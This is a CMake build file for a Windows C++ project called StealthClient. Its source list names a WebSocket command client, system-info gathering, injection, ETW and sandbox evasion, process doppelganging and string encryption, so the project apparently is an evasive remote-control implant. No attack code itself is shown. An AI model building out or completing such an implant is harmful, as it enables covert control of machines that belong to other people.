cmake_minimum_required(VERSION 3.16)
project(StealthClient)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Set build type to Release by default
if(NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Release)
endif()

# Compiler-specific options
if(MSVC)
    add_compile_options(/W4 /permissive-)
    add_compile_definitions(_CRT_SECURE_NO_WARNINGS)
else()
    add_compile_options(-Wall -Wextra -Wpedantic)
endif()

# Try to find packages, but make them optional for now
find_package(PkgConfig QUIET)

# Try to find libwebsockets
if(PkgConfig_FOUND)
    pkg_check_modules(LIBWEBSOCKETS libwebsockets)
endif()

# Try to find nlohmann/json
find_package(nlohmann_json QUIET)

# If not found, we'll use simple alternatives
if(NOT LIBWEBSOCKETS_FOUND)
    message(WARNING "libwebsockets not found, using simple WebSocket implementation")
    set(USE_SIMPLE_WEBSOCKET TRUE)
endif()

if(NOT nlohmann_json_FOUND)
    message(WARNING "nlohmann/json not found, using simple JSON implementation")
    set(USE_SIMPLE_JSON TRUE)
endif()

# Include directories
include_directories(${CMAKE_CURRENT_SOURCE_DIR})
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/core)
if(LIBWEBSOCKETS_FOUND)
    include_directories(${LIBWEBSOCKETS_INCLUDE_DIRS})
endif()

# Source files
set(SOURCES
    main.cpp
    websocket_client.cpp
    command_handler.cpp
    system_info.cpp
    json_utils.cpp
    anti_detection.cpp
    core/injection.h
    core/evasion/dynamic_api.cpp
    core/evasion/string_obfuscation.cpp
    core/evasion/etw_evasion.cpp
    core/evasion/sandbox_detection.cpp
    core/evasion/control_flow.cpp
    core/evasion/memory_protection.cpp
    core/evasion/process_doppelganging.cpp
    core/evasion/hardware_evasion.cpp
    core/encryption/xor_cipher.cpp
    core/encryption/dynamic_keys.cpp
    core/encryption/string_encryption.cpp
)

# Header files
set(HEADERS
    websocket_client.h
    command_handler.h
    system_info.h
    json_utils.h
    anti_detection.h
    core/evasion/dynamic_api.h
    core/evasion/string_obfuscation.h
    core/evasion/etw_evasion.h
    core/evasion/sandbox_detection.h
    core/evasion/control_flow.h
    core/evasion/memory_protection.h
    core/evasion/process_doppelganging.h
    core/evasion/hardware_evasion.h
    core/encryption/xor_cipher.h
    core/encryption/dynamic_keys.h
    core/encryption/string_encryption.h
)

# Create executable
add_executable(${PROJECT_NAME} ${SOURCES} ${HEADERS})

# Link libraries
if(LIBWEBSOCKETS_FOUND)
    target_link_libraries(${PROJECT_NAME} ${LIBWEBSOCKETS_LIBRARIES})
endif()

if(nlohmann_json_FOUND)
    target_link_libraries(${PROJECT_NAME} nlohmann_json::nlohmann_json)
endif()

# Windows-specific libraries
if(WIN32)
    target_link_libraries(${PROJECT_NAME}
        ws2_32
        iphlpapi
        psapi
        crypt32
        advapi32
        kernel32
        user32
        ntdll
    )
endif()

# Compiler definitions
target_compile_definitions(${PROJECT_NAME} PRIVATE
    WIN32_LEAN_AND_MEAN
    NOMINMAX
    DEBUG_OUTPUT_ENABLED
    _DEBUG
)

# Force debug output even in release builds
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        FORCE_DEBUG_OUTPUT
    )
endif()

# Set output directory
set_target_properties(${PROJECT_NAME} PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
)

# Installation
install(TARGETS ${PROJECT_NAME}
    RUNTIME DESTINATION bin
)

# Print configuration info
message(STATUS "Build type: ${CMAKE_BUILD_TYPE}")
message(STATUS "C++ standard: ${CMAKE_CXX_STANDARD}")
if(LIBWEBSOCKETS_FOUND)
    message(STATUS "libwebsockets version: ${LIBWEBSOCKETS_VERSION}")
else()
    message(STATUS "libwebsockets: NOT FOUND (using simple implementation)")
endif()
if(nlohmann_json_FOUND)
    message(STATUS "nlohmann/json version: ${nlohmann_json_VERSION}")
else()
    message(STATUS "nlohmann/json: NOT FOUND (using simple implementation)")
endif()

# Create a simple build script for Windows
if(WIN32)
    # Create a simple build script
    file(WRITE ${CMAKE_BINARY_DIR}/build.bat "@echo off\necho Building Stealth Client...\ncmake --build . --config Debug\necho Build complete!\npause\n")
endif()
